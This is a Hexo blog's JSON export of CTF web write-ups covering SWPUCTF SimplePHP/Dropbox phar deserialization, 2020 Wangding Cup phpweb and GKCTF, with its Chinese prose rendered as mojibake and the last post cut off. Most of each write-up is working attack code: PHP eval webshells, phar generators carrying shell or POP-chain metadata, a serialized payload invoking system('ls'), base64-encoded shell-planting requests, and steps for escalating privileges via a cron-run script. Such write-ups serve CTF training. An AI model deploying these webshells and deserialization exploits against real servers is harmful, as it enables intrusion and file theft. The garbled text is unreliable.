{"meta":{"title":"æœˆå‡ºä»äº‘","subtitle":"","description":"","author":null,"url":"http://example.com","root":"/"},"pages":[{"title":"categories","date":"2014-12-22T04:39:04.000Z","updated":"2020-10-26T06:26:08.178Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"ååŒ—èµ›åŒºDropbox","slug":"ååŒ—èµ›åŒºDropbox","date":"2020-10-29T05:49:57.000Z","updated":"2020-10-29T08:11:17.892Z","comments":true,"path":"2020/10/29/ååŒ—èµ›åŒºDropbox/","link":"","permalink":"http://example.com/2020/10/29/%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BADropbox/","excerpt":"","text":"1.çŸ¥è¯†ç‚¹å­¦ä¹ 1.1 pharæµè‡ªPHP5.3.0å¼€å§‹ï¼Œphpä¾¿æ”¯æŒè¯¥æ•°æ®æµ æ”¯æŒallow_url_fopen no æ”¯æŒallow_url_include No å…è®¸è¯»å– Yes å…è®¸å†™å…¥ Yes åœ¨PHPçš„å®˜ç½‘æ‰‹å†Œå½“ä¸­ï¼Œè¯¥æµç”¨äºè§£å‹pharæ–‡ä»¶ï¼Œæˆ‘ä»¬å…è®¸åˆ©ç”¨è¯¥æµç›´æ¥è¯»å–è¢«å‹ç¼©çš„pharæ–‡ä»¶ï¼Œä½†æ˜¯æˆ‘ä»¬å®æˆ˜ä¸­å´å‘ç°ï¼Œè¯¥æµå…è®¸æˆ‘ä»¬è¯»å–ä»»æ„ä¸€ä¸ªæ–‡ä»¶ï¼Œåªè¦ä»–ä»¬æ˜¯ç»è¿‡å‹ç¼©çš„æ–‡ä»¶ï¼ŒPHPä¼šè‡ªåŠ¨çš„è§£å‹æ–‡ä»¶ï¼Œå¹¶ä¸”è¯»å–é‡Œé¢çš„PHPã€‚ pharçš„å‚è€ƒæ–‡ç« ï¼š 1https:&#x2F;&#x2F;blog.csdn.net&#x2F;Leroi_Liu&#x2F;article&#x2F;details&#x2F;86293701 ï¼ˆæ„Ÿè§‰PHPæœ‰ç‚¹åƒåœ¾..ä½¿ç”¨Pharæ–‡ä»¶ï¼Œä½†æ˜¯å´å®Œå…¨æ²¡æœ‰ä»»ä½•çš„è¿‡æ»¤ï¼Œä»–å°†è¯†åˆ«ä»»ä½•æ¨¡å—çš„åç¼€ï¼Œç›´æ¥å°†å…¶è§£å‹ï¼Œä¹‹åè¯»å–å…¶ä¸­çš„PHPæ–‡ä»¶ ä¾‹å¦‚æˆ‘ä»¬æ„é€ ä¸€ä¸ªtest.phpï¼Œæˆ‘ä»¬å°†å…¶å‹ç¼©æˆtest.zipï¼Œä¹‹åä¿®æ”¹zipåç¼€ä¸ºjpgï¼Œä»–è¿˜æ˜¯ä¼šèƒ½å¤Ÿè¯†åˆ«ï¼Œå¹¶ä¸”è¯»å–å…¶ä¸­çš„æ–‡ä»¶ 1.1.1 pharå†™ğŸæ–‡ä»¶åŒ…å«æµ‹è¯•çš„ä»£ç å¦‚ä¸‹ï¼š index.php 1234&lt;?php //phar://./test.jpg/test.phpinclude($_POST[&#x27;url&#x27;]);?&gt; test.php 1&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt; æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å¦‚ä¸‹ä»£ç ç”Ÿæˆä¸€ä¸ªpharæ–‡ä»¶ï¼Œå¹¶ä¸”ç”ŸæˆğŸ 12345678910111213&lt;?php@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub;//$phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest$phar-&gt;addFromString(&quot;test.php&quot;, &quot;&lt;?php eval(\\$_POST[123]); ?&gt;&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering(); åˆ©ç”¨å¦‚ä¸‹ï¼š 1.1.2 pharååºåˆ—åŒ–åœ¨ä»¥å‰çš„å¤§éƒ¨åˆ†äº‹ä»¶ï¼Œæˆ‘ä»¬éƒ½æ˜¯åˆ©ç”¨ååºåˆ—åŒ–çš„å‡½æ•°ï¼Œä½†æ˜¯äººä»¬ç°åœ¨å®‰å…¨æ„è¯†è¶Šæ¥è¶Šé«˜ä¹‹åï¼Œè¿™ç§åˆ©ç”¨æ–¹å¼è¶Šæ¥è¶Šéš¾ã€‚ ä½†æ˜¯Phar://è¯»å–æ–‡ä»¶pharçš„æ—¶å€™ï¼Œä¼šååºåˆ—åŒ–meta-dataå‚¨å­˜çš„ä¿¡æ¯ Pharæ–‡ä»¶çš„ä¸€ä¸ªæ ‡å‡†ç‰¹å¾å¦‚ä¸‹ï¼š 12&lt;?php __HALT_COMPILER(); ?&gt; O:10:&quot;TestObject&quot;:0:&#123;&#125;\b test.tx\u0002 GBMB æˆ‘ä»¬å¯ä»¥å‘ç°Meta-dataçš„å†…å®¹å°±æ˜¯ä»¥ååºåˆ—åŒ–çš„å½¢å¼å‚¨å­˜çš„ï¼Œåˆ©ç”¨Pharåè®®è§£æçš„æ—¶å€™éƒ½ä¼šååºåˆ—åŒ–ï¼ŒåŒæ—¶æ–‡ä»¶æ“ä½œå‡½æ•°ä¸€èˆ¬éƒ½èƒ½ç”¨ä¼ªåè®®æµï¼Œæ‰€ä»¥Phar://çš„ä¾›ç»™é¢è¿˜æ˜¯ç›¸å½“å¹¿çš„ã€‚ æ‰€ä»¥æ»¡è¶³å¦‚ä¸‹æ¡ä»¶çš„æ—¶å€™è¯¥ç±»å‹åºåˆ—åŒ–å¯ä»¥ä½¿ç”¨ï¼š å¯ä»¥ä¸Šä¼ Pharæ–‡ä»¶(æˆ–è€…æ–‡ä»¶è‡ªå·±ä½¿ç”¨Pharè¯»å–) å…·æœ‰å¯åˆ©ç”¨çš„é­”æœ¯æ–¹æ³• æ–‡ä»¶æ“ä½œå‡½æ•°çš„å‚æ•°å¯ç”¨ ä¾‹é¢˜ï¼š[SWPUCTF 2018]SimplePHP é¦–å…ˆå°±å°è¯•è¯»å–ä¸€æ³¢æ–‡ä»¶file.php 1234567891011121314151617&lt;?php header(&quot;content-type:text/html;charset=utf-8&quot;); include &#x27;function.php&#x27;; include &#x27;class.php&#x27;; ini_set(&#x27;open_basedir&#x27;,&#x27;/var/www/html/&#x27;); $file = $_GET[&quot;file&quot;] ? $_GET[&#x27;file&#x27;] : &quot;&quot;; if(empty($file)) &#123; echo &quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;; &#125; $show = new Show(); if(file_exists($file)) &#123; $show-&gt;source = $file; $show-&gt;_show(); &#125; else if (!empty($file))&#123; die(&#x27;file doesn\\&#x27;t exists.&#x27;); &#125; ?&gt; Class.php 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879&lt;?phpclass C1e4r&#123; public $test; public $str; public function __construct($name) &#123; $this-&gt;str = $name; &#125; public function __destruct() &#123; $this-&gt;test = $this-&gt;str; echo $this-&gt;test; &#125;&#125;class Show&#123; public $source; public $str; public function __construct($file) &#123; $this-&gt;source = $file; //$this-&gt;source = phar://phar.jpg echo $this-&gt;source; &#125; public function __toString() &#123; $content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; return $content; &#125; public function __set($key,$value) &#123; $this-&gt;$key = $value; &#125; public function _show() &#123; if(preg_match(&#x27;/http|https|file:|gopher|dict|\\.\\.|f1ag/i&#x27;,$this-&gt;source)) &#123; die(&#x27;hacker!&#x27;); &#125; else &#123; highlight_file($this-&gt;source); &#125; &#125; public function __wakeup() &#123; if(preg_match(&quot;/http|https|file:|gopher|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker~&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125;class Test&#123; public $file; public $params; public function __construct() &#123; $this-&gt;params = array(); &#125; public function __get($key) &#123; return $this-&gt;get($key); &#125; public function get($key) &#123; if(isset($this-&gt;params[$key])) &#123; $value = $this-&gt;params[$key]; &#125; else &#123; $value = &quot;index.php&quot;; &#125; return $this-&gt;file_get($value); &#125; public function file_get($value) &#123; $text = base64_encode(file_get_contents($value)); return $text; &#125;&#125;?&gt; function.php 12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php //show_source(__FILE__); include &quot;base.php&quot;; header(&quot;Content-type: text/html;charset=utf-8&quot;); error_reporting(0); function upload_file_do() &#123; global $_FILES; $filename = md5($_FILES[&quot;file&quot;][&quot;name&quot;].$_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;.jpg&quot;; //mkdir(&quot;upload&quot;,0777); if(file_exists(&quot;upload/&quot; . $filename)) &#123; unlink($filename); &#125; move_uploaded_file($_FILES[&quot;file&quot;][&quot;tmp_name&quot;],&quot;upload/&quot; . $filename); echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;; &#125; function upload_file() &#123; global $_FILES; if(upload_file_check()) &#123; upload_file_do(); &#125; &#125; function upload_file_check() &#123; global $_FILES; $allowed_types = array(&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;); $temp = explode(&quot;.&quot;,$_FILES[&quot;file&quot;][&quot;name&quot;]); $extension = end($temp); if(empty($extension)) &#123; //echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; &#125; else&#123; if(in_array($extension,$allowed_types)) &#123; return true; &#125; else &#123; echo &#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;; return false; &#125; &#125; &#125; ?&gt; åŒæ—¶è¿˜æ‹¥æœ‰ä¸€ä¸ªf1ag.php ç›´æ¥è®¿é—®çš„è¯ä¼šä¸å…è®¸ï¼Œåœ¨showç±»å½“ä¸­æ”¾å‡ºäº†æç¤ºï¼Œpahr://phar.jpg æŸ¥æ‰¾POPé“¾çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š Testçš„$text = base64_encode(file_get_contents($value));ä½œä¸ºæˆ‘ä»¬çš„ç»ˆæç›®æ ‡ æˆ‘ä»¬æŸ¥çœ‹$valueæ˜¯ä»å“ªé‡Œä¼ æ¥çš„ï¼Œå‘ç°ä¸€è¡Œï¼š 1$value = $this-&gt;params[$key]; ä¹‹åæŸ¥çœ‹ï¼Œå‘ç°$keyé€šè¿‡__getè¿›è¡Œä¼ å¯¼ äºæ˜¯æ„é€  1$c-&gt;params[&#x27;source&#x27;] = &quot;/var/www/html/f1ag.php&quot;; å›åˆ°ä¸Šé¢çœ‹ï¼Œå› ä¸ºä¹‹å‰æœ‰echoï¼Œé€šè¿‡echoæŸ¥æ‰¾tostring äºæ˜¯å¯¹sourceè¿›è¡Œæ§åˆ¶ 1$content = $this-&gt;str[&#x27;str&#x27;]-&gt;source; å¯¹Aè¿›è¡Œååºåˆ—åŒ–å³å¯ã€‚ 1.2 open_basedirè¯¥å‡½æ•°æ˜¯phpç”¨äºåŸºäºxç›®å½•å…è®¸ï¼Œåˆ©ç”¨è¯¥å‡½æ•°ï¼ŒPHPå¯ä»¥é™åˆ¶ç”¨æˆ·çš„è¯»å–æ–‡ä»¶èŒƒå›´ï¼Œè¿™ä¹Ÿå°±å¾ˆå¥½çš„è§£é‡Šäº†ä¸ºä»€ä¹ˆæˆ‘ä»¬åªèƒ½è¯»å–åˆ°../../index.phpçš„å†…å®¹ï¼Œè€Œæ— æ³•è¯»å–åˆ°æ ¹ç›®å½•ä¸‹flag.txtçš„æ–‡ä»¶äº† 2.åšé¢˜æ€è·¯1.ä»»æ„æ–‡ä»¶è¯»å–è¿™é“é¢˜å…è®¸ä¸‹è½½æ–‡ä»¶ï¼Œä¸Šä¼ æ–‡ä»¶å’Œåˆ é™¤æ–‡ä»¶ï¼Œæˆ‘ä»¬ä¸‹è½½æ–‡ä»¶çš„æ—¶å€™å¯ä»¥ä»»æ„ä¿®æ”¹æ–‡ä»¶åï¼ˆä½†æ˜¯ç”±äºopen_basedirçš„é™åˆ¶ï¼Œæˆ‘ä»¬æ²¡æ³•åŠæ³•è¯»å–åˆ°flag æ•…åˆ©ç”¨å¦‚ä¸‹æ–¹å¼èƒ½å¤Ÿæ‰¾åˆ°class.php,index.php,download.php,delete.phpçš„å†…å®¹ 2.æ„é€ pharååºåˆ—åŒ–æ ¹æ®å‰é¢çš„çŸ¥è¯†ï¼Œæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬å¯ä»¥åˆ©ç”¨pharç”Ÿæˆæ–‡ä»¶ï¼Œæ„é€ popé“¾è¯»å–æ–‡ä»¶ï¼Œé—®é¢˜å°±åœ¨äºå¦‚ä½•æ„é€ popäº†ï¼Œæˆ‘ä»¬åœ¨è¿™é“é¢˜å¾ˆæ˜æ˜¾è¦æ‰¾åˆ°çš„å‡½æ•°å°±æ˜¯file_get_contentsï¼Œèƒ½æ‰¾åˆ°Fileç±»ä¸‹çš„close()ç±»ä¼šä½¿ç”¨ï¼Œäºæ˜¯æŸ¥æ‰¾å…¨æ–‡å½“ä¸­ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰é­”æœ¯æ–¹æ³•èƒ½å¤Ÿä½¿ç”¨åˆ°closeç±»ï¼š æœ€ç»ˆåœ¨Userç±»ä¸­æŸ¥æ‰¾åˆ°ï¼š 1234567891011121314class User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; // ä¸­é—´ç•¥ public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125; äºæ˜¯ç¬¬ä¸€æ¬¡æˆ‘å°è¯•å¦‚æ­¤æ„é€ æ–‡ä»¶ï¼š 1234567891011121314151617181920&lt;?phpclass User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close(); &#125;&#125;class File &#123; public $filename=&quot;test.txt&quot;; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125; ç»“æœåœ¨æœ¬åœ°fuzzçš„æ—¶å€™å°±å‘ç°è¿™æ ·å­å°±å‹æ ¹æ²¡å›æ˜¾å•Šã€‚åæ¥æ‰çŸ¥é“å¿…é¡»è¾“å‡ºä¸€ä¸‹æ‰èƒ½çœ‹è§å†…å®¹ã€‚ã€‚ 1234567class File &#123; public $filename=&quot;test.txt&quot;; public function close() &#123; echo file_get_contents($this-&gt;filename); return file_get_contents($this-&gt;filename); &#125;&#125; äºæ˜¯å°±å¡ä½äº†ï¼Œä¸Šä¸‹å†å®¡è®¡ä»£ç ï¼Œæ‰¾ä¸€ä¸ªechoå‡½æ•°ï¼Œå‘ç°æ°å¥½å°±åœ¨FileListå½“ä¸­ã€‚ã€‚ï¼š 1234567891011121314151617public function __destruct() &#123; $table = &#x27;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&#x27;; $table .= &#x27;&lt;thead&gt;&lt;tr&gt;&#x27;; foreach ($this-&gt;funcs as $func) &#123; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&#x27; . htmlentities($func) . &#x27;&lt;/th&gt;&#x27;; &#125; $table .= &#x27;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&#x27;; $table .= &#x27;&lt;/thead&gt;&lt;tbody&gt;&#x27;; foreach ($this-&gt;results as $filename =&gt; $result) &#123; //è¿™å¥æ˜¯å…¨å±€çš„æ ¸å¿ƒ $table .= &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= &#x27;&lt;td class=&quot;text-center&quot;&gt;&#x27; . htmlentities($value) . &#x27;&lt;/td&gt;&#x27;; &#125; $table .= &#x27;&lt;td class=&quot;text-center&quot; filename=&quot;&#x27; . htmlentities($filename) . &#x27;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;ä¸‹è½½&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&#x27;; $table .= &#x27;&lt;/tr&gt;&#x27;; &#125; echo $table; æƒ³åŠæ³•ï¼Œèƒ½å¤Ÿæ§åˆ¶resultï¼Œå‘ç°é¢˜ç›®ä¹Ÿæ­£å¥½ç»™å‡ºäº†callè¿™ä¸ªé­”æœ¯æ–¹æ³•ï¼š 123456public function __call($func, $args) &#123; array_push($this-&gt;funcs, $func); foreach ($this-&gt;files as $file) &#123; $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; è‡ªå·±çœ‹äº†ä¸€äº›ï¼Œè¿™ä¸ªå…¶å®å°±æ˜¯ä¸€ä¸ªæ‰‹å†™çš„å›è°ƒå‡½æ•°å˜›ã€‚ äºæ˜¯å°è¯•æ€è€ƒï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡FileListå‡ºå‘ 12345678910111213141516class User &#123; public $db;&#125;class File &#123; public $filename;&#125;class FileList &#123; private $files; private $results; private $funcs;public function __construct($path) &#123; $files = new File(); $this-&gt;funcs = array($files); $filenames =&quot;/flag.txt&quot;; &#125;&#125; æˆ‘ä»¬å…ˆnewä¸€ä¸ªUserç±»å‡ºæ¥ï¼Œå¹¶å°†dbæŒ‡å‘FileListï¼Œä¹‹åç±»ä¼šè¢«é”€æ¯ï¼Œå°†ä¼šè°ƒç”¨FileListå½“ä¸­çš„callæ–¹æ³•ï¼Œcallæ–¹æ³•éœ€è¦æˆ‘ä»¬æŒ‡å®šå‚æ•°åå’Œfilenameï¼Œæ‰€ä»¥åœ¨__constructä¸­è¿›è¡Œä¿®æ”¹,æœ€ç»ˆè°ƒè¯•å¾— 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374&lt;?phpclass User &#123; public $db; public function __construct() &#123; global $db; $this-&gt;db = $db; &#125; public function __destruct() &#123; $this-&gt;db-&gt;close();// phpinfo(); &#125;&#125;class FileList &#123; private $files; private $results; public function __construct() &#123; $file = new File();// $this-&gt;results = array(); $file-&gt;filename = &quot;test.txt&quot;; $this-&gt;files = array($file);// var_dump($file);// phpinfo(); &#125; public function __call($func, $args) &#123;// phpinfo(); foreach ($this-&gt;files as $file) &#123;// var_dump( $file-&gt;$func()); //å°†resultè®¾ç½®æˆtest.txtå½“ä¸­çš„å†…å®¹ $this-&gt;results[$file-&gt;name()][$func] = $file-&gt;$func(); &#125; &#125; public function __destruct() &#123;//é”€æ¯çš„æ—¶å€™å°±ä¼šè¢«è¾“å‡ºäº†ï¼ foreach ($this-&gt;results as $filename =&gt; $result) &#123; $table = &#x27;&lt;tr&gt;&#x27;; foreach ($result as $func =&gt; $value) &#123; $table .= htmlentities($value); &#125; $table .= htmlentities($filename); &#125; echo $table; &#125;&#125;class File &#123; public $filename; public function name() &#123; return basename($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;$a = new User();$a-&gt;db = new FileList();?&gt; è°ƒè¯•æˆåŠŸä¹‹åæ„é€ exp 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass User &#123; public $db;&#125;class FileList &#123; private $files; private $results; public function __construct() &#123; $file = new File();// $this-&gt;results = array(); $file-&gt;filename = &quot;/flag.txt&quot;; $this-&gt;files = array($file); &#125;&#125;class File &#123; public $filename; public function name() &#123; return basename($this-&gt;filename); &#125; public function close() &#123; return file_get_contents($this-&gt;filename); &#125;&#125;$a = new User();$a-&gt;db = new FileList();@unlink(&quot;5.phar&quot;);$phar = new Phar(&quot;5.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar$phar-&gt;startBuffering();$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub;$phar-&gt;setMetadata($a); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest //å¦‚æœæˆ‘ä»¬æ˜¯è¦å†™pharğŸå°±ç”¨ä¸‹é¢çš„ï¼Œä¸ç„¶å°±ç”¨ä¸Šé¢çš„setMeatadata$phar-&gt;addFromString(&quot;test.php&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶//ç­¾åè‡ªåŠ¨è®¡ç®—$phar-&gt;stopBuffering();?&gt; ä¹‹åç”¨burpä¸Šä¼ ï¼Œåˆ é™¤çš„æ—¶å€™è¯»å–æ–‡ä»¶å³å¯ï¼š","categories":[],"tags":[]},{"title":"2020ç½‘é¼æ¯phpweb","slug":"2020ç½‘é¼æ¯phpweb","date":"2020-10-28T11:19:40.000Z","updated":"2020-10-28T11:34:56.495Z","comments":true,"path":"2020/10/28/2020ç½‘é¼æ¯phpweb/","link":"","permalink":"http://example.com/2020/10/28/2020%E7%BD%91%E9%BC%8E%E6%9D%AFphpweb/","excerpt":"","text":"1.è®¿é—®é¡µé¢curl+uï¼Œå¯ä»¥æŸ¥çœ‹åˆ°è¿™äº›ï¼š 1234&lt;form id=form1 name=form1 action=&quot;index.php&quot; method=post&gt; &lt;input type=hidden id=func name=func value=&#x27;date&#x27;&gt; &lt;input type=hidden id=p name=p value=&#x27;Y-m-d h:i:s a&#x27;&gt;&lt;/body&gt; è¿™æ ·çš„è¯æˆ‘ä»¬æ¨æµ‹å®ƒå°±æ˜¯ç”¨äº†ä¸€ä¸ªcall_user_funcçš„å›è°ƒå‡½æ•°.. ç„¶åè‡ªå·±åœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œæœ€åæ‰æƒ³èµ·æ¥file_get_contentså‡½æ•°å¯ä»¥è¯»æ–‡ä»¶ï¼Œ äºæ˜¯æ„é€ ï¼š å¾—åˆ°æºç ï¼š 123456789101112131415161718192021222324252627282930&lt;?php $disable_fun = array(&quot;exec&quot;,&quot;shell_exec&quot;,&quot;system&quot;,&quot;passthru&quot;,&quot;proc_open&quot;,&quot;show_source&quot;,&quot;phpinfo&quot;,&quot;popen&quot;,&quot;dl&quot;,&quot;eval&quot;,&quot;proc_terminate&quot;,&quot;touch&quot;,&quot;escapeshellcmd&quot;,&quot;escapeshellarg&quot;,&quot;assert&quot;,&quot;substr_replace&quot;,&quot;call_user_func_array&quot;,&quot;call_user_func&quot;,&quot;array_filter&quot;, &quot;array_walk&quot;, &quot;array_map&quot;,&quot;registregister_shutdown_function&quot;,&quot;register_tick_function&quot;,&quot;filter_var&quot;, &quot;filter_var_array&quot;, &quot;uasort&quot;, &quot;uksort&quot;, &quot;array_reduce&quot;,&quot;array_walk&quot;, &quot;array_walk_recursive&quot;,&quot;pcntl_exec&quot;,&quot;fopen&quot;,&quot;fwrite&quot;,&quot;file_put_contents&quot;); function gettime($func, $p) &#123; $result = call_user_func($func, $p); $a= gettype($result); if ($a == &quot;string&quot;) &#123; return $result; &#125; else &#123;return &quot;&quot;;&#125; &#125; class Test &#123; var $p = &quot;Y-m-d h:i:s a&quot;; var $func = &quot;date&quot;; function __destruct() &#123; if ($this-&gt;func != &quot;&quot;) &#123; echo gettime($this-&gt;func, $this-&gt;p); &#125; &#125; &#125; $func = $_REQUEST[&quot;func&quot;]; $p = $_REQUEST[&quot;p&quot;]; if ($func != null) &#123; $func = strtolower($func); if (!in_array($func,$disable_fun)) &#123; echo gettime($func, $p); &#125;else &#123; die(&quot;Hacker...&quot;); &#125; &#125; ?&gt; ä¹‹åæˆ‘åˆå¡ä½äº†ï¼Œçœ‹ä¼¼å¥½åƒæ˜¯ååºåˆ—åŒ–ï¼Œåˆå¥½åƒä¸æ˜¯å•Šï¼Ÿæ‰¾ä¸åˆ°ååºåˆ—åŒ–çš„ç‚¹ï¼Œä¸€æ—¶é—´åˆåƒµä½äº†ï¼Œè¿‡äº†ä¸€ä¼šå„¿çœ‹äº†å¤§ä½¬çš„WPæ‰æ„è¯†åˆ°æ˜¯è‡ªå·±æ€è·¯è¿˜ä¸å¤Ÿçµæ´»ï¼Œè¿™é“é¢˜æ²¡æœ‰unserializeï¼Œä½†æ˜¯å¯ä»¥åŠ¨è°ƒå‡½æ•°ï¼Œå®¡è®¡ä»£ç ä¸­çš„Testç±»ï¼Œå…¶å®ä»–æ˜¯æœ‰gettimeçš„ï¼Œè¿™ä¸ªå‡½æ•°å°±æ˜¯ä¸€ä¸ªåŠ¨è°ƒå‡½æ•°ï¼Œé‚£æˆ‘ä»¬çš„æ€è·¯å°±å¾ˆæ˜ç¡® 2.æ„é€ payload1234567891011121314&lt;?phpclass Test &#123; var $p = &quot;ls&quot;; var $func = &quot;system&quot;;// function __destruct() &#123;// if ($this-&gt;func != &quot;&quot;) &#123;// echo gettime($this-&gt;func, $this-&gt;p);// &#125;// &#125;&#125;$test = new Test();echo (serialize($test)); ä¹‹åå°†è¿™ä¸€æ®µå¸¦å…¥åˆ°é¢˜ç›®å½“ä¸­ï¼Œæœ€ç»ˆåœ¨tmpç›®å½•ä¸‹æ‰¾åˆ°","categories":[],"tags":[]},{"title":"GKCTF","slug":"GKCTF","date":"2020-10-27T08:04:11.000Z","updated":"2020-10-28T13:16:07.944Z","comments":true,"path":"2020/10/27/GKCTF/","link":"","permalink":"http://example.com/2020/10/27/GKCTF/","excerpt":"","text":"æŠ½ç©ºæŠŠGKCTFçš„é¢˜ç›®åˆ·äº†ï¼Œå…ˆä»ç¬¬ä¸€é¢˜å¼€å§‹è¯´å§ 1.Check inè¯´æ˜¯ä¸€é“ç­¾åˆ°é¢˜ï¼Œä½†æ˜¯å¾—ç”¨åˆ°pwnçš„çŸ¥è¯†ã€è™½ç„¶expç›´æ¥å°±èƒ½æ‰“äº† ç¬¬ä¸€æ­¥è®¿é—®å°±èƒ½å®¡è®¡åˆ°ä»£ç ï¼š 1234567891011121314151617181920&lt;?php highlight_file(__FILE__);class ClassName&#123; public $code = null; public $decode = null; function __construct() &#123; $this-&gt;code = @$this-&gt;x()[&#x27;Ginkgo&#x27;]; $this-&gt;decode = @base64_decode( $this-&gt;code ); @Eval($this-&gt;decode); &#125; public function x() &#123; return $_REQUEST; &#125;&#125;new ClassName(); å°±æ˜¯ä¸€ä¸ªå¾ˆç®€å•çš„åºåˆ—åŒ–ï¼Œæˆ‘ä»¬ç›´æ¥base64ç¼–ç Ginkgoä¹‹åçš„å€¼å³å¯ã€‚ 1?Ginkgo=cGhwaW5mbygpOw== å®¡è®¡åˆ°PHPçš„ä»£ç ï¼Œä¸‹ä¸€æ­¥æˆ‘ä»¬ä¼šå‘ç°è‡ªå·±èšå‰‘è¿æ¥ä¸ä¸Šï¼Œæ²¡åŠæ³•ï¼Œåªèƒ½è‡ªå·±å†å†™ä¸€ä¸ªshelläº† 1?Ginkgo=ZXZhbCgkX1BPU1Rbc2FrYW5pXSk7AA== å¯†ç æ˜¯sakaniï¼Œä¹‹åå°±å¯ä»¥ç”¨èšå‰‘é“¾æ¥ä¸Šå»äº†ï¼Œä½†æ˜¯æˆ‘ä»¬å‘ç°flagæ²¡æ³•è¯»å•Šã€‚è€Œä¸”å› ä¸ºdisable_functionï¼Œæˆ‘ä»¬ æ²¡æœ‰åŠæ³•ä½¿ç”¨è™šæ‹Ÿç»ˆç«¯äº†ã€‚ ä½†æ˜¯æˆ‘ä»¬æŸ¥çœ‹ç‰ˆæœ¬ï¼Œç‰ˆæœ¬ä¸ºPHP7.3ï¼Œå¯ä»¥å°è¯•ç”¨å†…æ ¸æ¼æ´ææƒï¼Œåœ¨tmpç›®å½•ï¼ˆ777ï¼‰ï¼Œä¸Šä¼ exp 1https://github.com/mm0r1/exploits ä¸Šä¼ è¿™é‡Œçš„gcæ¼æ´ï¼Œä¹‹åæ‰§è¡Œå‘½ä»¤å³å¯ 2.è€å…«å°è¶…å¸‚å„¿æ ¹æ®è¿™ç¯‡æ–‡ç« å¯ä»¥åšå‡ºæ¥å‰åŠæ®µæˆåŠŸæ‹¿åˆ°shellï¼š 1https:&#x2F;&#x2F;www.nctry.com&#x2F;1660.html è¿™é‡Œæˆ‘ä¼ å…¥æˆåŠŸä¹‹åè·¯å¾„ä¸ºï¼š 1http:&#x2F;&#x2F;d315d6f1-ec5d-40f2-9c4f-358445b37fba.node3.buuoj.cn&#x2F;public&#x2F;static&#x2F;index&#x2F;default&#x2F;1.php ç”¨èšå‰‘è¿å…¥ï¼Œæ ¹ç›®å½•ä¸‹æ‰¾åˆ°flagå´ä¸èƒ½è¯»ï¼Œè¯»atuo.shå¯ä»¥çŸ¥é“å®ƒæ¯åˆ†é’Ÿä¼šæ‰§è¡Œä¸€æ¬¡makeflaghint.pyï¼ŒåŒæ—¶å…¶æƒé™æ˜¯766ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥æ”¹~ï¼Œé‚£æˆ‘ä»¬å»æ”¹è¿™ä¸ªpyçš„å†…å®¹è®©ä»–è¯»flagå³å¯ï¼Œç­‰ä¸€åˆ†é’Ÿï¼Œè¯»åˆ°flag 3.EzNodeå°±æ˜¯ä¸€ä¸ªå¾ˆåŸºç¡€çš„ä»£ç å®¡è®¡ï¼š 12345678910111213141516171819202122232425262728app.use(bodyParser.urlencoded(&#123; extended: false &#125;));app.use(bodyParser.json());// 2020.1/WORKER2 è€æ¿è¯´ä¸ºäº†åæœŸæ–¹ä¾¿ä¼˜åŒ–app.use((req, res, next) =&gt; &#123; if (req.path === 